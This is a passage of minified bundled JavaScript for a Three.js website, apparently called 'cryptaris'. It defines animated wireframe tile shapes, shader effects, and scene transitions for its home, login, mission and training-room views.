var TileBase=require("./tile-base"),Cubes=function(){function e(){for(var e=new THREE.MeshBasicMaterial({opacity:.15,color:16755251,transparent:!0,wireframeLinewidth:6,depthTest:!1,wireframe:!0,blending:THREE.AdditiveBlending}),t=200,o=new THREE.BoxGeometry(t,t,t),r=n-1;r>=0;r--){var d=new THREE.Mesh(o,e);d.rotation.x=Math.PI/6,d.rotation.z=Math.PI/4,i.add(d),a.push(d)}}function t(){a.forEach(function(e,t){t+=3,e.rotation.x+=(t-s)*r.xSpeed*1e-4,e.rotation.y+=(t-s)*r.ySpeed*1e-4,e.rotation.z+=(t-s)*r.zSpeed*1e-4}),d++}var i=new THREE.Object3D,n=3,a=[],o=30/n,r={xSpeed:0,ySpeed:o,zSpeed:0},d=0,s=.5*n;e(),_.extend(this,TileBase),_.extend(this,{update:t,object3D:i})};module.exports=Cubes;
},{"./tile-base":95}],93:[function(require,module,exports){
var TileBase=require("./tile-base");require("shared/lib/CurveExtras");var Insignia=function(e){function t(){var t;if(4===e.type){var n=new THREE.Curves.TorusKnot(.4*r),o=100;t=new THREE.TubeGeometry(n,o,4,2,!0)}else t=3===e.type?new THREE.TorusKnotGeometry(140,4,10,2,2,4):2===e.type?new THREE.TorusKnotGeometry(r,4,20,2,5,8):new THREE.TorusKnotGeometry(r,4,20,2,6,8);for(var d=new THREE.MeshBasicMaterial({color:16755251,blending:THREE.AdditiveBlending,transparent:!0,opacity:.2,depthTest:!1}),p=new THREE.MeshBasicMaterial({color:16755251,blending:THREE.AdditiveBlending,transparent:!0,opacity:.5,depthTest:!1}),s=i-1;s>=0;s--){var E=s%2===0?d:p,T=new THREE.Mesh(t,E);a.add(T)}}function n(){var t=.5*a.children.length;a.children.forEach(function(n,r){r+=o*i*2,n.rotation.x+=(r-t)*d.xSpeed*3e-4,n.rotation.y+=(r-t)*d.ySpeed*3e-4,2===e.type||4===e.type?n.rotation.z+=(r/o/i-t)*d.zSpeed*.003:n.rotation.z+=.001*d.zSpeed}),p++}var r=140,i=3;3===e.type&&(i=7);var a=new THREE.Object3D,o=2,d={xSpeed:0,ySpeed:o,zSpeed:4};4===e.type&&(d.ySpeed=0,d.xSpeed=0,d.zSpeed=3),2===e.type&&(d.ySpeed=0,d.xSpeed=0,d.zSpeed=2);var p=0;t(),_.extend(this,TileBase),_.extend(this,{update:n,object3D:a})};module.exports=Insignia;
},{"./tile-base":95,"shared/lib/CurveExtras":122}],94:[function(require,module,exports){
var TileBase=require("./tile-base"),PringleCurve=THREE.Curve.create(function(e){this.radius=e},function(e){var t=e,i=this.radius*Math.cos(t*Math.PI*2),n=Math.sin(t*Math.PI*4)*this.radius/2,r=this.radius*Math.sin(t*Math.PI*2);return new THREE.Vector3(i,n,r)}),Pringle=function(e){function t(){for(var e=new PringleCurve(r),t=100,i=2,d=4,o=new THREE.TubeGeometry(e,t,d,i,!0),s=new THREE.MeshBasicMaterial({color:16755251,blending:THREE.AdditiveBlending,transparent:!0,opacity:.2,depthTest:!1}),h=new THREE.MeshBasicMaterial({color:16755251,blending:THREE.AdditiveBlending,transparent:!0,opacity:.5,depthTest:!1}),c=a-1;c>=0;c--){var l=c%2===0?s:h,p=new THREE.Mesh(o,l);n.add(p)}}function i(){var t=.5*n.children.length;n.children.forEach(function(i,n){if(n+=d*a*2,1===e.type){var r=n%3===0?1:-1;i.rotation.x+=(n-t)*o.xSpeed*1e-4*r}else i.rotation.x+=(n-t)*o.xSpeed*1e-4;i.rotation.y+=(n-t)*o.ySpeed*1e-4,i.rotation.z+=.001*o.zSpeed}),s++}var n=new THREE.Object3D,r=140,a=7,d=2,o={xSpeed:d,ySpeed:0,zSpeed:0};2===e.type&&(o.xSpeed=2,o.zSpeed=4);var s=0;t(),_.extend(this,TileBase),_.extend(this,{object3D:n,update:i})};module.exports=Pringle;
},{"./tile-base":95}],95:[function(require,module,exports){
var TileBase={disable:function(){this.object3D.children.forEach(function(a){a.material.color=new THREE.Color,a.material.baseOpacity=.75*a.material.opacity,a.material.opacity=a.material.baseOpacity})},setOpacity:function(a){this.object3D.children.forEach(function(e){e.material.opacity=e.material.baseOpacity*a})},exportObj:function(a){var e=(new THREE.OBJExporter).parse(this.object3D);return console.save(e,a),e}};module.exports=TileBase;
},{}],96:[function(require,module,exports){
var Insignia=require("./insignia"),Pringle=require("./pringle"),Cubes=require("./cubes"),Tile=function(e){var i,a=e.position,n=e.rotation,t=e.type,r=e.disabled;switch(t){case 0:i=new Insignia({type:2});break;case 1:i=new Insignia({type:1});break;case 2:i=new Insignia({type:3});break;case 3:i=new Pringle({type:1});break;case 4:i=new Pringle({type:2});break;case 5:i=new Insignia({type:4});break;case 6:i=new Cubes({});break;default:i=new Insignia({type:1})}return i.object3D.children.forEach(function(e){e.material.baseOpacity=e.material.opacity}),i.object3D.position.copy(a),n&&(i.object3D.rotation.x=n.x,i.object3D.rotation.y=n.y,i.object3D.rotation.z=n.z),r&&i.disable(),i};module.exports=Tile;
},{"./cubes":92,"./insignia":93,"./pringle":94}],97:[function(require,module,exports){
var Towers=function(e){function n(){a.on("update",t),o=new THREE.Object3D,E.add(o),r=new THREE.LineBasicMaterial({color:16777215,linewidth:1.5,blending:THREE.AdditiveBlending,depthWrite:!1,transparent:!0,opacity:.3});var e=new THREE.Geometry;e.vertices.push(new THREE.Vector3(-p,0,-p),new THREE.Vector3(-p,0,p),new THREE.Vector3(p,0,p),new THREE.Vector3(p,0,-p),new THREE.Vector3(-p,0,-p));for(var n=[],i=0;d>=i;i++)n.push(i/d);n=_.shuffle(n),v=[];for(var i=0;d>i;i++){var w=new THREE.Object3D;o.add(w);var f=T/d*i-T/2;d/2>=i?f-=u:f+=u,w.position.set(f,0,Math.random()*c),w.initPos=n[i],v.push(w);for(var H=0;s>H;H++){var R=new THREE.Line(e,r);R.position.y=c*H-c*s/2,w.add(R)}}}function t(){for(var e=0;d>e;e++)v[e].position.z=(v[e].initPos+a.getVizTime()*f.speed)%1*w*2-w,v[e].position.y=a.getVizTime()*f.speed*4%1*c}function i(e,n){TweenMax.to(r,n,{opacity:e})}var o,r,a=e.webGLMain,E=e.parentObj,d=11,s=30,p=500,c=100,w=3e3,T=2e3,u=500,v=[],f={on:!1,speed:.02,opacity:.4,width:2};return{init:n,update:t,fade:i}};module.exports=Towers;
},{}],98:[function(require,module,exports){
require("shared/lib/three.js-master/examples/js/postprocessing/EffectComposer.js"),require("shared/lib/three.js-master/examples/js/postprocessing/RenderPass.js"),require("shared/lib/three.js-master/examples/js/postprocessing/ShaderPass.js"),require("shared/lib/three.js-master/examples/js/postprocessing/MaskPass.js"),require("shared/lib/three.js-master/examples/js/shaders/CopyShader.js"),require("shared/lib/three.js-master/examples/js/shaders/VignetteShader.js"),require("shared/shaders/FilmShader.js");var BarrelBlurShader=require("shared/shaders/BarrelBlurShader.js"),RadialBlurShader=require("shared/shaders/RadialBlurShader.js"),FXHandler=function(e){function r(){o.on("update",s),o.on("resize",a),d=new THREE.EffectComposer(o.getRenderer()),t=new THREE.RenderPass(o.getScene(),o.getCamera()),u=new THREE.ShaderPass(THREE.CopyShader),l={},l.vignette=new THREE.ShaderPass(THREE.VignetteShader),l.barrelBlur=new THREE.ShaderPass(BarrelBlurShader),l.film=new THREE.ShaderPass(THREE.FilmShader),l.radial=new THREE.ShaderPass(RadialBlurShader),l.vignette.uniforms.offset.value=1.4,l.barrelBlur.uniforms.amount.value=.01,l.film.uniforms.sCount.value=1200,l.film.uniforms.sIntensity.value=.4,l.film.uniforms.nIntensity.value=.2,l.film.uniforms.grayscale.value=0,l.radial.uniforms.expo.value=1.3,d=new THREE.EffectComposer(o.getRenderer()),d.addPass(t),d.addPass(l.barrelBlur),d.addPass(l.radial),d.addPass(l.film),d.addPass(l.vignette),d.addPass(u),u.renderToScreen=!0}function s(){d.render(.1),m+=.1,l.barrelBlur.uniforms.time.value=m,l.film.uniforms.time.value=m;var e=o.getSunPos();l.radial.uniforms.center.value.x=.8*(e.x+.5)+.1,l.radial.uniforms.center.value.y=.8*(e.y+.5)+.1}function a(){d&&d.setSize(o.getVizSize().w,o.getVizSize().h),l.film.uniforms.sCount.value=2*o.getVizSize().h}function i(e){l.radial.uniforms.expo.value=e?1.1:0}function n(){o.off("update",s),o.off("resize",a)}var l,d,t,u,o=e.webGLMain,m=0;return{init:r,update:s,onResize:a,showRadialBlur:i,disable:n}};module.exports=FXHandler;
},{"shared/lib/three.js-master/examples/js/postprocessing/EffectComposer.js":130,"shared/lib/three.js-master/examples/js/postprocessing/MaskPass.js":131,"shared/lib/three.js-master/examples/js/postprocessing/RenderPass.js":132,"shared/lib/three.js-master/examples/js/postprocessing/ShaderPass.js":133,"shared/lib/three.js-master/examples/js/shaders/CopyShader.js":135,"shared/lib/three.js-master/examples/js/shaders/VignetteShader.js":137,"shared/shaders/BarrelBlurShader.js":143,"shared/shaders/FilmShader.js":146,"shared/shaders/RadialBlurShader.js":149}],99:[function(require,module,exports){
var StarBars=require("../elements/star-bars"),About=function(e){function t(){l=new THREE.Object3D,u.getMainHolder().add(l),m=new THREE.CSS3DObject(E),u.getCSSHolder().add(m);var e=.9;m.scale.set(e,e,e),l.position.z=-3e3,m.position.z=-3e3,TweenMax.set(m.element,{autoAlpha:0});var t=new THREE.PlaneGeometry(300,300,1,1),a=THREE.ImageUtils.loadTexture("assets/imgs/site-webgl/about.jpg");a.minFilter=THREE.LinearFilter,a.magFilter=THREE.LinearFilter;for(var n=new THREE.MeshBasicMaterial({map:a,transparent:!0,blending:THREE.AdditiveBlending,opacity:.1}),o=0;d>o;o++){var i=new THREE.Mesh(t,n);l.add(i),i.position.z=-c*o,e=1+.8*o,i.scale.set(e,e,e)}l.rotation.z=Math.PI/4,p=new StarBars({webGLMain:u,parentObj:l}),p.init(),s()}function a(){l.rotation.z+=.002}function n(){i(),TweenMax.fromTo(l.position,u.transTime,{z:-3e3},{z:0,ease:u.positionEase}),TweenMax.fromTo(m.position,u.transTime,{z:-3e3},{z:-100,ease:u.positionEase}),TweenMax.fromTo(m.element,u.transTime,{autoAlpha:0},{autoAlpha:1});var e=Math.PI/4;TweenMax.fromTo(l.rotation,u.transTime,{z:e},{z:0,ease:u.rotationEase}),TweenMax.fromTo(m.rotation,u.transTime,{z:e},{z:0,ease:u.rotationEase})}function o(){TweenMax.fromTo(l.position,u.transTime,{z:0},{z:1e3,ease:u.positionEase}),TweenMax.fromTo(m.position,u.transTime,{z:-100},{z:1e3,ease:u.positionEase}),TweenMax.fromTo(m.element,u.transTime,{autoAlpha:1},{autoAlpha:0,onComplete:s})}function i(){l.visible=!0,$(E).css("display","block"),r(),l.add(u.getStars().getGroupHolder())}function s(){l.visible=!1,$(E).css("display","none"),T()}function r(){u.on("update",a)}function T(){u.off("update",a)}var l,m,p,u=e.webGLMain,E=e.el||document.createElement("div"),d=8,c=70;return{init:t,update:a,transIn:n,transOut:o}};module.exports=About;
},{"../elements/star-bars":90}],100:[function(require,module,exports){
var ATUtil=require("shared/utils/general-utils"),FadeMaterialShader=require("shared/shaders/FadeMaterialShader.js");require("shared/utils/TriangleGeometry.js");var ImprovedNoise=require("shared/lib/ImprovedNoise"),paths=require("shared/paths"),client=require("shared/utils/client/client"),Home=function(e){function a(){f.on("resize",d),m=new THREE.Object3D,f.getMainHolder().add(m),T=new THREE.CSS3DObject(H),f.getCSSHolder().add(T);var e=1.3;T.scale.set(e,e,e);var a=new THREE.MeshBasicMaterial({color:16777215,transparent:!0,fog:!1,opacity:.25,blending:THREE.AdditiveBlending,map:THREE.ImageUtils.loadTexture(paths.CDN+"imgs/site-webgl/sun.png")});p=new THREE.Mesh(new THREE.PlaneGeometry(10,10),a);var t=2e3;if(p.scale.set(t,t,t),p.position.set(0,0,-3e3),p.material.opacity=b.sunOpacity,p.scale.set(b.sunSize,b.sunSize,b.sunSize),m.add(p),f.getIsMobile()||client.browser.name.indexOf("IE")>-1||client.browser.name.indexOf("Edge")>-1||client.browser.name.indexOf("Safari")>-1){var i=new THREE.PlaneGeometry(1081,329,1,1);g=THREE.ImageUtils.loadTexture(paths.CDN+"imgs/site-webgl/title-w-2.png"),g.minFilter=g.magFilter=THREE.LinearFilter;var r=new THREE.MeshBasicMaterial({map:g,transparent:!0});E=new THREE.Mesh(i,r)}else{M=document.createElement("video"),M.setAttribute("crossorigin","anonymous"),M.src=paths.CDN+"imgs/site-webgl/title-cryptaris.mp4",M.muted="muted",M.loop=!0,M.preload="auto";var n=new THREE.VideoTexture(M);n.minFilter=THREE.LinearFilter,n.magFilter=THREE.LinearFilter,n.format=THREE.RGBFormat;var s=new THREE.MeshBasicMaterial({map:n,blending:THREE.AdditiveBlending,depthTest:!1,transparent:!0,side:THREE.DoubleSide}),l=new THREE.PlaneGeometry(1280,720,1,1);E=new THREE.Mesh(l,s)}m.add(E),E.position.z=0,E.position.y=50,E.scale.set(b.titleSize,b.titleSize,b.titleSize);var w=new THREE.PlaneGeometry(1400,800,1,1),R=300;h=new THREE.Object3D,m.add(h);for(var y=0;3>y;y++){var S=THREE.ImageUtils.loadTexture(paths.CDN+"imgs/site-webgl/greebles"+y+".jpg");S.minFilter=THREE.LinearFilter,S.magFilter=THREE.LinearFilter;var z=new THREE.MeshBasicMaterial({map:S,transparent:!0,blending:THREE.AdditiveBlending,side:THREE.DoubleSide,opacity:.15}),x=new THREE.Mesh(w,z);h.add(x),x.position.z=-R*(y+1),x.scale.x=x.scale.y=4}c=new THREE.Object3D,m.add(c),c.position.z=-300;var F=new THREE.ShaderMaterial({uniforms:FadeMaterialShader.uniforms,vertexShader:FadeMaterialShader.vertexShader,fragmentShader:FadeMaterialShader.fragmentShader,depthTest:!1,side:THREE.DoubleSide,transparent:!0}),A=new THREE.TriangleGeometry(100);u=[];for(var I=3e3,P=0;v>P;P++){var O=new THREE.Mesh(A,F);O.position.set(ATUtil.randomRange(-I,I),ATUtil.randomRange(-I,I),ATUtil.randomRange(-3e3,600)),O.initPos=Math.random(),O.theta=Math.random()*Math.PI,O.phi=Math.random()*Math.PI*2,O.rotSpeed=ATUtil.randomRange(-.1,.1),O.rotation.z=Math.random()*Math.PI*2,O.rotation.x=Math.random()*Math.PI*2,O.rotation.y=Math.random()*Math.PI*2,c.add(O),u.push(O)}o()}function t(){R=p.position.clone(),R.setFromMatrixPosition(p.matrixWorld),R.project(f.getCamera()),p.rotation.z+=.002,y+=.002;for(var e=0;v>e;e++){var a=u[e],t=(a.initPos+y)%1*4e3-3e3;a.position.z=t,a.rotation.x+=a.rotSpeed}var i=w.noise(50*y,0,0)/2+.5,r=ATUtil.lerp(i,400,1e3);p.scale.set(r,r,r),m.rotation.x=w.noise(f.getVizTime()*S,0,0)*z,m.rotation.y=w.noise(f.getVizTime()*S,100,0)*z,T.rotation.copy(m.rotation)}function i(){n(),TweenMax.fromTo(m.position,f.transTime,{z:-3e3},{z:-250,ease:f.positionEase}),TweenMax.fromTo(T.position,f.transTime,{z:-3e3},{z:-250,ease:f.positionEase}),TweenMax.fromTo(T.element,f.transTime,{autoAlpha:0},{autoAlpha:1}),TweenMax.fromTo(p.material,2,{opacity:0},{opacity:b.sunOpacity,delay:1}),TweenMax.delayedCall(3,function(){M&&(0!==M.currentTime&&(M.currentTime=0),M.play())}),TweenMax.fromTo(E.material,1,{opacity:0},{opacity:1,delay:3});for(var e=0;3>e;e++)TweenMax.fromTo(h.children[e].material,2,{opacity:0},{opacity:.15,delay:3})}function r(){TweenMax.fromTo(m.position,f.transTime,{z:-250},{z:1200,ease:f.positionEase}),TweenMax.fromTo(T.position,f.transTime,{z:-250},{z:1200,ease:f.positionEase}),TweenMax.fromTo(T.element,f.transTime,{autoAlpha:1},{autoAlpha:0,onComplete:o}),TweenMax.fromTo(p.material,f.transTime/4,{opacity:b.sunOpacity},{opacity:0}),c.visible=!1}function n(){m.visible=!0,$(H).css("display","block"),s(),m.add(f.getStars().getGroupHolder()),c.visible=!0}function o(){m.visible=!1,$(H).css("display","none"),l()}function s(){f.off("update",t),f.on("update",t)}function l(){f.off("update",t)}function d(){var e=f.getVizSize().w/f.getVizSize().h;1>e?m.scale.set(.9*e,.9*e,.9*e):m.scale.set(1,1,1)}var m,T,p,E,c,u,h,g,M,w=new ImprovedNoise,f=e.webGLMain,H=e.el,R=new THREE.Vector2(.5,.5),v=600,y=0,S=.04,z=.3,b={titleSize:.9,sunOpacity:.6,sunSize:1500};return{init:a,update:t,transIn:i,transOut:r,getSunPos:function(){return R}}};module.exports=Home;
},{"shared/lib/ImprovedNoise":123,"shared/paths":141,"shared/shaders/FadeMaterialShader.js":145,"shared/utils/TriangleGeometry.js":215,"shared/utils/client/client":217,"shared/utils/general-utils":220}],101:[function(require,module,exports){
var ATUtil=require("shared/utils/general-utils"),Login=function(e){function a(){T=new THREE.Object3D,m.getMainHolder().add(T),p=new THREE.CSS3DObject(d),m.getCSSHolder().add(p);var e=.9;p.scale.set(e,e,e),T.position.z=-3e3,p.position.z=-3e3,TweenMax.set(p.element,{autoAlpha:0});for(var a=new THREE.RingGeometry(90,150,6,1,0,2*Math.PI),o=new THREE.MeshBasicMaterial({}),t=0;u>t;t++){var i=new THREE.Mesh(a,o);T.add(i),i.visible=!1;var n=11184810,r=new THREE.EdgesHelper(i,n);T.add(r),r.material.fog=!0,r.material.linewidth=1,r.material.transparent=!0,e=1.5,i.scale.set(e,e,e);var l=.004;i.rotSpeed=ATUtil.randomRange(-l,l),i.edge=r,i.initPos=t/u,E.push(i)}s()}function o(){for(var e=0;u>e;e++){if(E[e].rotation.z+=E[e].rotSpeed,E[e].position.z=(E[e].initPos+m.getVizTime()*c)%1*(f+z)-f,E[e].position.z<0)var a=ATUtil.normalize(E[e].position.z,-f,0);else var a=ATUtil.normalize(E[e].position.z,z,0);E[e].edge.material.opacity=a,m.trace(a)}}function t(){n(),TweenMax.fromTo(T.position,m.transTime,{z:-3e3},{z:-30,ease:m.positionEase}),TweenMax.fromTo(p.position,m.transTime,{z:-3e3},{z:0,ease:m.positionEase}),TweenMax.fromTo(p.element,m.transTime,{autoAlpha:0},{autoAlpha:1});var e=Math.PI/4;TweenMax.fromTo(T.rotation,m.transTime,{z:e},{z:0,ease:m.rotationEase}),TweenMax.fromTo(p.rotation,m.transTime,{z:e},{z:0,ease:m.rotationEase})}function i(){TweenMax.fromTo(T.position,m.transTime,{z:-30},{z:1e3,ease:m.positionEase}),TweenMax.fromTo(p.position,m.transTime,{z:0},{z:1e3,ease:m.positionEase}),TweenMax.fromTo(p.element,m.transTime,{autoAlpha:1},{autoAlpha:0,onComplete:s})}function n(){T.visible=!0,$(d).css("display","block"),r(),T.add(m.getStars().getGroupHolder())}function s(){T.visible=!1,$(d).css("display","none"),l()}function r(){m.on("update",o)}function l(){m.off("update",o)}var T,p,m=e.webGLMain,d=e.el,u=4,f=600,z=500,c=.02,E=[];return{init:a,update:o,transIn:t,transOut:i}};module.exports=Login;
},{"shared/utils/general-utils":220}],102:[function(require,module,exports){
var Towers=require("../elements/towers"),MainMenu=function(e){function n(){p=new THREE.Object3D,m.getMainHolder().add(p),u=new THREE.CSS3DObject(f),m.getCSSHolder().add(u),p.position.z=-6e3,u.position.z=-3e3,TweenMax.set(u.element,{autoAlpha:0}),l=new Towers({webGLMain:m,parentObj:p}),l.init(),s()}function o(){}function t(){i(),TweenMax.fromTo(p.position,m.transTime,{z:-1e3},{z:0,ease:m.positionEase}),TweenMax.fromTo(u.position,m.transTime,{z:-1e3},{z:0,ease:m.positionEase}),TweenMax.fromTo(u.element,m.transTime,{autoAlpha:0},{autoAlpha:1}),l.fade(.3,m.transTime)}function a(){TweenMax.fromTo(p.position,m.transTime,{z:0},{z:1e3,ease:m.positionEase}),TweenMax.fromTo(u.position,m.transTime,{z:0},{z:1e3,ease:m.positionEase}),TweenMax.fromTo(u.element,m.transTime,{autoAlpha:1},{autoAlpha:0,onComplete:s}),l.fade(0,m.transTime/2)}function i(){p.visible=!0,$(f).css("display","block"),r(),p.add(m.getStars().getGroupHolder())}function s(){p.visible=!1,$(f).css("display","none"),T()}function r(){m.on("update",o)}function T(){m.off("update",o)}var p,u,l,m=e.webGLMain,f=e.el;return{init:n,update:o,transIn:t,transOut:a}};module.exports=MainMenu;
},{"../elements/towers":97}],103:[function(require,module,exports){
var Hammer=require("hammerjs"),ATUtil=require("shared/utils/general-utils"),Mountains=require("../elements/mountains"),Tile=require("../elements/tile-geometry/tile"),DotFloor=require("../elements/dot-floor"),client=require("shared/utils/client/client"),ns=require("shared/namespace"),appModel=require("models/app-model"),Mission=function(e){function o(){appModel.on("mission-tile-click",n);var e=document.createElement("div");w=new THREE.Object3D,g.getMainHolder().add(w),h=new THREE.CSS3DObject(e),g.getCSSHolder().add(h),f=new THREE.Object3D(e),w.add(f),f.position.z=y,T=new THREE.CSS3DObject(e),T.position.z=y,h.add(T),D=y;for(var o=null!==window.location.search.match("export"),i=0;x>i;i++){var t=new THREE.CSS3DObject(z[i]);t.position.z=-M*i,T.add(t);var s=new Tile({type:i,disabled:z[i].classList.contains("disabled"),position:t.position.clone()});f.add(s.object3D),S.push(s),o&&!function(e,o){setTimeout(function(){var i="tile_"+o+".obj";e.exportObj("tile_"+o+".obj"),console.log("saved",i)},1e3*o+1e3)}(s,i)}E=new Mountains({webGLMain:g,parentObj:f,isMission:!0}),E.init(),b=new DotFloor({webGLMain:g,parentObj:f,isMission:!0}),b.init(),v=new Hammer(document.getElementById("webgl")),v.get("swipe").set({threshold:1,velocity:.1,direction:Hammer.DIRECTION_VERTICAL}),v.on("panmove",p),c(),O=0}function i(){g.trace(f.position.z),H*=.975,H>j?(t(--O),H=.75*-j):-j>H&&(t(++O),H=.75*j),C&&(y>D?D-=.3*(D-y):D>5700&&(D-=.3*(D-5700))),f.position.z+=(D-f.position.z-.5*H)/20,T.position.z=f.position.z,_.forEach(T.children,function(e,o){var i=-(f.position.z+e.position.z-g.getCamera().position.z),n=Math.max(0,1-ATUtil.normalize(i,700,2e3));e.element.style.opacity=n,S[o].setOpacity(n),S[o].update()})}function n(e){D+=600,C=!1}function t(e){O=ATUtil.clamp(e,0,x-1),O>0&&6>O&&ns.audioProxy.triggerEvent("mission_scroll"),D=M*e+y}function s(e){console.log("challengeFlythrough",e),t(e);for(var o=0;e>o;o++)S[o].object3D.visible=!1,T.children[o].element.style.display="none";C=!1,setTimeout(function(){D+=600},2e3)}function a(){l(),TweenMax.fromTo(w.position,g.transTime,{z:-4e3},{z:0,ease:g.positionEase}),TweenMax.fromTo(h.position,g.transTime,{z:-3e3},{z:0,ease:g.positionEase});var e=Math.PI/4;TweenMax.fromTo(w.rotation,g.transTime,{z:e},{z:0,ease:g.rotationEase}),TweenMax.fromTo(h.rotation,g.transTime,{z:e},{z:0,ease:g.rotationEase})}function r(){TweenMax.fromTo(w.position,g.transTime,{z:0},{z:6e3,ease:g.positionEase}),TweenMax.fromTo(h.position,g.transTime,{z:0},{z:6e3,ease:g.positionEase,onComplete:c}),b.show(!1),E.show(!1),g.getStars().showLowerStars(!0),f.visible=!1,g.setBkgndCursor("auto")}function l(){f.position.z=y,T.position.z=y,D=y,w.visible=!0,_.forEach(T.children,function(e){e.element.style.display="block"}),f.add(g.getStars().getGroupHolder()),g.getStars().showLowerStars(!1),b.show(!0),E.show(!0),d(),f.visible=!0,g.setBkgndCursor("ns-resize")}function c(){w.visible=!1,_.forEach(T.children,function(e){e.element.style.display="none"}),u()}function d(){"IE"!==client.browser.name&&$("body").on("wheel mousewheel",m),g.on("update",i)}function u(){$("body").off("wheel mousewheel",m),g.off("update",i)}function m(e){var o=0;void 0!==e.originalEvent.wheelDelta?o=e.originalEvent.wheelDelta:void 0!==e.originalEvent.deltaY&&(o=-e.originalEvent.deltaY),H+=.6*o}function p(e){H-=1.5*e.deltaY}var w,h,f,T,E,b,v,g=e.webGLMain,z=e.els,M=1e3,y=-300,j=600,S=[],x=z.length,D=y,O=0,H=0,C=!0;return(-1!==window.location.search.indexOf("screenshot")||"IE"===client.browser.name)&&(x=0),{init:o,update:i,transIn:a,transOut:r,navToTile:t,challengeFlythrough:s}};module.exports=Mission;
},{"../elements/dot-floor":86,"../elements/mountains":87,"../elements/tile-geometry/tile":96,"hammerjs":4,"models/app-model":46,"shared/namespace":140,"shared/utils/client/client":217,"shared/utils/general-utils":220}],104:[function(require,module,exports){
var Ripples=require("../elements/ripples"),Profile=function(e){function n(){u=new THREE.Object3D,c.getScene().add(u),f=new Ripples({webGLMain:c,parentObj:u}),f.init(),r()}function t(){}function i(){a(),TweenMax.fromTo(u.position,c.transTime,{z:-3e3},{z:0,ease:c.positionEase});var e=Math.PI/4;TweenMax.fromTo(u.rotation,c.transTime,{z:e},{z:0,ease:c.rotationEase})}function o(){TweenMax.fromTo(u.position,c.transTime,{z:0},{z:1e3,ease:c.positionEase,onComplete:r})}function a(){u.visible=!0,s(),u.add(c.getStars().getGroupHolder())}function r(){u.visible=!1,p()}function s(){c.on("update",t)}function p(){c.off("update",t)}var u,f,c=e.webGLMain;return{init:n,update:t,transIn:i,transOut:o}};module.exports=Profile;
},{"../elements/ripples":88}],105:[function(require,module,exports){
var Mountains=require("../elements/mountains"),Tile=require("../elements/tile-geometry/tile"),DotFloor=require("../elements/dot-floor"),appModel=require("models/app-model"),client=require("shared/utils/client/client"),TrainingRoom=function(o){function e(){appModel.on(appModel.events.TR_FOCUS,t),appModel.on("tr-tile-click",n);var o=document.createElement("div");y=new THREE.Object3D,b.getMainHolder().add(y),v=new THREE.CSS3DObject(o),b.getCSSHolder().add(v),z=new THREE.CSS3DObject(o),v.add(z),g=new THREE.Object3D(o),y.add(g);for(var e=700,i=0;E>i;i++){var a=-(2*Math.PI)/E*i+Math.PI,s=new THREE.CSS3DObject(M[i]);s.position.x=Math.sin(a)*e,s.position.z=Math.cos(a)*e,s.position.y=0,s.rotation.y=a-Math.PI,z.add(s);var r=i;i>3&&r++;var c=new Tile({type:r,disabled:M[i].classList.contains("disabled"),position:s.position.clone(),rotation:s.rotation.clone()});g.add(c.object3D),H.push(c)}S=new Mountains({webGLMain:b,parentObj:g,isMission:!1}),S.init(),x=new DotFloor({webGLMain:b,parentObj:g,isMission:!1}),x.init(),d()}function n(o){TweenMax.to(b.getCamera().position,2,{z:-100,ease:Expo.easeOut}),6===o&&(o=5),t(o)}function t(o){if("next"===o)j+=2*Math.PI/E;else if("prev"===o)j-=2*Math.PI/E;else{var e=2*Math.PI/E*(o-1);j+=Math.atan2(Math.sin(e-j),Math.cos(e-j))}}function i(){g.rotation.y+=(j-g.rotation.y)/20,z.rotation.y=g.rotation.y,appModel.trigger(appModel.events.TR_ROTATE,g.rotation.y),_.forEach(H,function(o){o.update()})}function a(){r(),TweenMax.fromTo(y.position,b.transTime,{z:-4e3},{z:T,ease:b.positionEase}),TweenMax.fromTo(v.position,b.transTime,{z:-3e3},{z:T,ease:b.positionEase});var o=Math.PI/4;TweenMax.fromTo(y.rotation,b.transTime,{z:o},{z:0,ease:b.rotationEase}),TweenMax.fromTo(v.rotation,b.transTime,{z:o},{z:0,ease:b.rotationEase})}function s(){TweenMax.fromTo(y.position,b.transTime,{z:T},{z:4e3,ease:b.positionEase}),TweenMax.fromTo(v.position,b.transTime,{z:T},{z:3e3,ease:b.positionEase,onComplete:d}),b.getStars().showLowerStars(!0),x.show(!1),S.show(!1),g.visible=!1,b.setBkgndCursor("auto")}function r(){g.rotation.y=0,z.rotation.y=0,j=0,y.visible=!0,_.forEach(z.children,function(o){o.element.style.display="block"}),c(),g.add(b.getStars().getGroupHolder()),b.getStars().showLowerStars(!1),x.show(!0),S.show(!0),g.visible=!0,b.setBkgndCursor("ew-resize")}function d(){y.visible=!1,_.forEach(z.children,function(o){o.element.style.display="none"}),u()}function c(){$("body").on("mousedown",f),$("body").on("mouseup",p),$("body").on("mouseleave",p),$("body").on("mousemove",l),$("body").on("touchstart",m),$("body").on("touchmove",h),$("body").on("touchend",p),b.on("update",i)}function u(){$("body").off("mousedown",f),$("body").off("mouseup",p),$("body").off("mouseleave",p),$("body").off("mousemove",l),$("body").off("touchstart",m),$("body").off("touchmove",h),$("body").off("touchend",p),b.off("update",i)}function l(o){P.x=o.clientX/window.innerWidth*2-1,P.y=2*-(o.clientY/window.innerHeight)+1,w()}function f(o){O=!0,C=P.clone(),R=g.rotation.y}function p(o){O=!1}function m(o){l(o.originalEvent.touches[0]),f(o.originalEvent.touches[0])}function h(o){l(o.originalEvent.touches[0])}function w(){O&&(I.subVectors(P,C),j=R-I.x*D)}var T=360,b=o.webGLMain,M=o.els,E=M.length;(-1!==window.location.search.indexOf("screenshot")||"IE"===client.browser.name)&&(E=0);var y,v,g,z,x,S,R,H=[],O=!1,C=new THREE.Vector2,I=new THREE.Vector2,j=0,D=1.4,P=new THREE.Vector2(0,0);return{init:e,update:i,transIn:a,transOut:s}};module.exports=TrainingRoom;
},{"../elements/dot-floor":86,"../elements/mountains":87,"../elements/tile-geometry/tile":96,"models/app-model":46,"shared/utils/client/client":217}],106:[function(require,module,exports){
